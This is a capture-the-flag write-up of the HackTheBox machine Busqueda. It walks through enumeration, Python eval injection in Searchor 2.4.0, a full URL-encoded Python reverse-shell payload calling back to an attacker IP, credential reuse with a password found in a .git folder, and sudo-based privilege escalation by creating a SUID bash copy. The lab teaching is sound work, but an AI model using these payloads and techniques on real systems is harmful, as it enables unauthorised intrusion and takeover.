---
title: HTB - Busqueda
author: nirajkharel
date: 2023-08-23 14:10:00 +0800
categories: [HackTheBox]
tags: [HTB, HackTheBox]
render_with_liquid: false
---


HTB — Busqueda
================


## HTB — Busqueda

A detailed walkthrough for solving Busqueda on HTB. The box contains vulnerability like Python Code Injection, Hardcoded Credentials, Credential Reuse, and privilege escalation through SUDO shell scaping.

![](https://cdn-images-1.medium.com/max/2000/1*c2P8JEp9YuziBw2Cjrmvpg.png)

## Enumeration

### NMAP

Let’s start with an NMAP Scanning to enumerate open ports and the services running on the IP.

    nmap -sC -sV -oA nmap/10.10.11.208 10.10.11.208 -vv

    PORT   STATE SERVICE REASON  VERSION
    22/tcp open  ssh     syn-ack OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
    | ssh-hostkey: 
    |   256 4f:e3:a6:67:a2:27:f9:11:8d:c3:0e:d7:73:a0:2c:28 (ECDSA)
    | ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBIzAFurw3qLK4OEzrjFarOhWslRrQ3K/MDVL2opfXQLI+zYXSwqofxsf8v2MEZuIGj6540YrzldnPf8CTFSW2rk=
    |   256 81:6e:78:76:6b:8a:ea:7d:1b:ab:d4:36:b7:f8:ec:c4 (ED25519)
    |_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPTtbUicaITwpKjAQWp8Dkq1glFodwroxhLwJo6hRBUK
    80/tcp open  http    syn-ack Apache httpd 2.4.52
    |_http-title: Did not follow redirect to http://searcher.htb/
    | http-methods: 
    |_  Supported Methods: GET HEAD POST OPTIONS
    |_http-server-header: Apache/2.4.52 (Ubuntu)
    Service Info: Host: searcher.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Two ports 22 and 80 are open which are for SSH and HTTP. Add 10.10.11.208 as searcher.htb on /etc/hosts. Open [http://searcher.htb](http://qreader.htb) on the web browser.

### Directory Enumeration

**Dirsearch**

    python3 dirsearch.py -u http://searcher.htb/
    
      _|. _ _  _  _  _ _|_    v0.4.2.6
     (_||| _) (/_(_|| (_| )
    
    Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11346
    
    
    Target: http://searcher.htb/
    
    [09:23:36] Starting: 
    [09:25:50] 405 -  153B  - /search
    [09:25:52] 403 -  277B  - /server-status
    [09:25:52] 403 -  277B  - /server-status/

No directories were found using dirsearch. We will run Feroxbuster instead and hope for a different result.

**Feroxbuster**

    feroxbuster -u http://searcher.htb -w /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-medium-directories.txt
    
     ___  ___  __   __     __      __         __   ___
    |__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
    |    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
    by Ben "epi" Risher 🤓                 ver: 2.3.3
    ───────────────────────────┬──────────────────────
     🎯  Target Url            │ http://searcher.htb
     🚀  Threads               │ 50
     📖  Wordlist              │ /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-medium-directories.txt
     👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500]
     💥  Timeout (secs)        │ 7
     🦡  User-Agent            │ feroxbuster/2.3.3
     💉  Config File           │ /etc/feroxbuster/ferox-config.toml
     🔃  Recursion Depth       │ 4
     🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
    ───────────────────────────┴──────────────────────
     🏁  Press [ENTER] to use the Scan Cancel Menu™
    ──────────────────────────────────────────────────
    405        5l       20w      153c http://searcher.htb/search
    403        9l       28w      277c http://searcher.htb/server-status
    [####################] - 3m     29999/29999   0s      found:2       errors:240    
    [####################] - 3m     29999/29999   149/s   http://searcher.htb

The result of Feroxbuster is same as well.

### Subdomain Enumeration

**FFuF**

The output of ffuf did not reveal any subdomains. It is possible that the application does not have any subdomains.

    ffuf -u http://searcher.htb -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -H "Host: FUZZ.searcher.htb" -fw 18
    
            /'___\  /'___\           /'___\       
           /\ \__/ /\ \__/  __  __  /\ \__/       
           \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
            \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
             \ \_\   \ \_\  \ \____/  \ \_\       
              \/_/    \/_/   \/___/    \/_/       
    
           v1.5.0-dev
    ________________________________________________
    
     :: Method           : GET
     :: URL              : http://searcher.htb
     :: Wordlist         : FUZZ: /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt
     :: Header           : Host: FUZZ.searcher.htb
     :: Follow redirects : false
     :: Calibration      : false
     :: Timeout          : 10
     :: Threads          : 40
     :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
     :: Filter           : Response words: 18
    ________________________________________________
    
    :: Progress: [4989/4989] :: Job [1/1] :: 150 req/sec :: Duration: [0:00:49] :: Errors: 0 ::

Let’s explore the web application. The application seems to be like some of of search tool which provides the URL for search query according to engine provided.

![](https://cdn-images-1.medium.com/max/3454/1*yHMQe9NwSqXeOBWMSLOx9Q.png)

Let’s submit the form and see how the application works.

![](https://cdn-images-1.medium.com/max/2000/1*F7bEmRtHLz97xeLoJyyyKw.png)

The application seems to have defined set of the domain name and it concatenates the provided query to search filed and then provide us the URL.

![](https://cdn-images-1.medium.com/max/2000/1*ouNqy00M1QBM9mL4H42OHw.png)

On clicking on auto redirect, the application redirects the user to the defined URL automatically.

![](https://cdn-images-1.medium.com/max/2000/1*Wh2cXS_GB4Apugjf5QNfBQ.png)

![](https://cdn-images-1.medium.com/max/2614/1*2fncXN1KtTAsTyUafWRMcw.png)

Let’s submit the form again and intercept the request in burp, we can see that when auto redirect is un-clicked it has two parameters in the request **engine** and **query**.

![](https://cdn-images-1.medium.com/max/2480/1*Fyuv5HKuJ9RtJFFcpyZY_g.png)

Let’s try if we can get any SQLi errors on the response.

![](https://cdn-images-1.medium.com/max/2634/1*BPtkjD-BHawKuFywcuBnpQ.png)

When auto redirects are clicked, we can have extra auto_redirect parameter on the request.

![](https://cdn-images-1.medium.com/max/2588/1*UvTNM8rj4BS52RitGLZ-MQ.png)

Submit the request with ‘ on query parameter again, we can see that the response does not displays us any URL. There might be some error occurred on the back-end. Might be SQL errors.

![](https://cdn-images-1.medium.com/max/2572/1*WB_uoSfuJ7Qx9joKlz9MyQ.png)

Copy the request into a file and run SQLMap.

    sqlmap -r sql.req

We did not discovered any SQL Injection vulnerabilities here.

![](https://cdn-images-1.medium.com/max/2000/1*gFpedtRC_fYRJfdDAnR-Jw.png)

Let’s try if the query parameter is vulnerable to command injection. Setup a tcpdump and insert the payloads like **;ping+attacker-ip** on the query parameter.

    sudo tcpdump -i tun0 icmp

We did not received any ICMP request as well.

![](https://cdn-images-1.medium.com/max/2000/1*1Nyl6TpTMkQs2neMH1zawg.png)

## Initial Access

On navigating to the footer section of the application, we can find that the application is developed in Flask and there is Searchor 2.4.0 hyperlink provided which opens the GitHub repo of Searchor.

![](https://cdn-images-1.medium.com/max/2000/1*hjUOCId5Vwi_Vo671LG2dA.png)

We can do some kind of source code analysis from here.

![](https://cdn-images-1.medium.com/max/2324/1*4hwnxTH42vpY81KJCMjH0Q.png)

Let’s view the commits, and we found that the repo was implementing eval() function on their code which as removed on it.

![](https://cdn-images-1.medium.com/max/3014/1*Ak5HGet8Wn-UcoefAwqUpA.png)

There is chance that our application is still using the vulnerable version of this repo.

![](https://cdn-images-1.medium.com/max/2000/1*VLfBVsLBu04pNa7kS3YF1w.png)

We can see at the commit that previously the application uses **eval() **function to generate the URL. The **eval()** function is a built-in Python method that allows you to evaluate a string as if it were a Python expression or statement. In the case of user input is supplied on the **eval() **function and if it is not properly sanitized, an attacker could inject additional code into the input string, which would be executed by **eval()**.

The vulnerability here can be in the **query** parameter, which is being used to construct a string that will be passed as an argument to the **Engine.search()** method.

Let’s try to inject some code on the query parameter.

![](https://cdn-images-1.medium.com/max/2000/1*oPOxPLhBE6xoaKszp-anzw.png)

Tried bunch of code injection techniques, but was not successful on it. I also tried performing some blind injections but i did not get any hit on it.

Going through the google again, I found a nice blog which explains the exploitation of python code injection on web applications.

[https://sethsec.blogspot.com/2016/11/exploiting-python-code-injection-in-web.html](https://sethsec.blogspot.com/2016/11/exploiting-python-code-injection-in-web.html)

![](https://cdn-images-1.medium.com/max/2000/1*_wJV6lJ-iP7BN4S6e_ICCw.png)

Let’s copy the payload and place it on the **query** parameter. The payload is:

    
    eval(compile('for x in range(1):\n import time\n time.sleep(20)','a','single'))

![](https://cdn-images-1.medium.com/max/2000/1*FqCsZlfvQwb2yQ911fpqgA.png)

Did not executed the code provided. Let’s wrap up this code into the single quote because as we can see on the commit above the query parameter is encapsulated with ‘{query}’, which makes our payload as:

    
    'eval(compile("for x in range(1):\n import time\n time.sleep(20)","a","single"))'

![](https://cdn-images-1.medium.com/max/2000/1*8lz2GjrlsTrUQKNiI7E9KQ.png)

No luck here as well. Later on with some conversations with ChatGPT, I found that we need to contact the injected payload which concatenates the **eval()** function call When this payload is executed without concatenation, Python would interpret the **eval()** function call as a separate statement, and then raise a syntax error on the injected code.

Let’s reform our payload now,

    '+eval(compile("for x in range(1):\n import time\n time.sleep(20)","a","single"))+'

![](https://cdn-images-1.medium.com/max/2000/1*kG1aF2Wg6jpNKesY4CBP3A.png)

But that did not worked as well. Let’s perform URL encoding on the payload since it will be passed into the URL.

![](https://cdn-images-1.medium.com/max/2260/1*qmaJd2CmmYG9OVhkihBOJw.png)

And we finally got a success. We will now should get a reverse shell as well.

Setup a netcat listener.

    nc -lvnp 1337

We can find the python reverse shell payload from here [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)

Craft a reverse shell payload. From the above cheatsheet provided, remember is convert “IP” and “/bin/sh” into ‘IP’ and ‘/bin/sh’ since the double inverted comma will break the code.

    import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('10.10.14.45',1337));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn('/bin/sh')

Concat it with our injection payload and URL encode it.

    '%2beval(compile("import+socket,os,pty%3bs%3dsocket.socket(socket.AF_INET,socket.SOCK_STREAM)%3bs.connect(('10.10.14.45',1337))%3bos.dup2(s.fileno(),0)%3bos.dup2(s.fileno(),1)%3bos.dup2(s.fileno(),2)%3bpty.spawn('/bin/sh')","a","single"))%2b'

![](https://cdn-images-1.medium.com/max/2000/1*vBgTODpaNwGw7A7czDPTfw.png)

Send the request using burp suite and we can get the reverse connection from the server serving us the shell.

![](https://cdn-images-1.medium.com/max/2000/1*WQNSnT1mtVMdajR-VArzNQ.png)

From here, we can get the user flag.

## Privilege Escalation

In the current directory where the shell is accessed, we can find a .git folder which contains a credentials for user **cody**.

![](https://cdn-images-1.medium.com/max/2000/1*954pDFTwLZBLrJBD8MRPOw.png)

Let’s try to SSH into the system using credentials **cody:jh1usoih2bkjaspwe92,** since it has port 22 open.

![](https://cdn-images-1.medium.com/max/2000/1*_cLs7CbgBt8nA8GMn5FqHA.png)

We were not able to login into the system as user **cody** because the user **cody** does not exists on the machine. On trying the same password for user **svc**, we were able to login into the system.

List down the commands that user **svc** can run into the system as root. Provide the password **jh1usoih2bkjaspwe92** when asked during **sudo -l**

![](https://cdn-images-1.medium.com/max/2000/1*wXgMp8fOiTS9S3WZ5l9Naw.png)

We can see that the user svc can run **/usr/bin/python3 /opt/scripts/system-checkup.py** as a root user.

Run the script with random parameters.

    sudo /usr/bin/python3 /opt/scripts/system-checkup.py whoami

![](https://cdn-images-1.medium.com/max/2000/1*9EUAhi2TlTkW15-vMZhU4g.png)

We can see that the script takes three parameters as **docker-ps, docker-inspect** and **full-checkup**. Let’s try to run it with parameter full-checkup.

    sudo /usr/bin/python3 /opt/scripts/system-checkup.py full-checkup

The script checks for running docker instances and the process and inspect the network interfaces used by them.

![](https://cdn-images-1.medium.com/max/2000/1*qZRyWkfVfTfX78jui23wzA.png)

Add gitea.searcher.htb on the /etc/hosts

    cat /etc/hosts
    # Host addresses
    127.0.0.1  localhost
    127.0.1.1  parrot
    10.10.11.208    searcher.htb gitea.searcher.htb

Opening the URL [http://gitea.searcher.htb](http://gitea.searcher.htb) on the browser, we can see some kind of web application which provides a self-hosted Git service.

![](https://cdn-images-1.medium.com/max/3058/1*zZLkklh4pjEfQUGJ2RfFEQ.png)

Let’s search if any exploits is available for gitea.

![](https://cdn-images-1.medium.com/max/2000/1*KZp2NsdQxY1ieyguX5dNvw.png)

We can find that the gitea is affected from Remote Code Execution. But the install gitea version is not affected to any Remote Code Execution.

Let’s go back to the output of **sudo -l, **we can see a wildcard on the command which means we can run anything on the place of that wildcard.

We can also see that the full-checkup is a bash file and when the command **sudo /usr/bin/python3 /opt/scripts/system-checkup.py full-checkup** is executed, it executes the **full-check.sh** file.

![](https://cdn-images-1.medium.com/max/2000/1*AjpSKJD1eM1xBqC8kwMxtg.png)

Let’s create a full-checkup.sh file in our home directory and assign the /bin/bash with SUID permission.

![](https://cdn-images-1.medium.com/max/2000/1*mmzLcU2ozyAlkapMt37Dtw.png)

We created a file called “full-checkup.sh” and copied the **/bin/bash** to a new location at **/tmp/bash**. Then, we assigned SUID permission to the new copy of the file.

After that, we made the **full-checkup.sh** file executable and ran a command. This resulted in the creation of a new bash file in the **/tmp/** directory. By running this new bash file, we were able to obtain the root flag.

Happy Hacking!
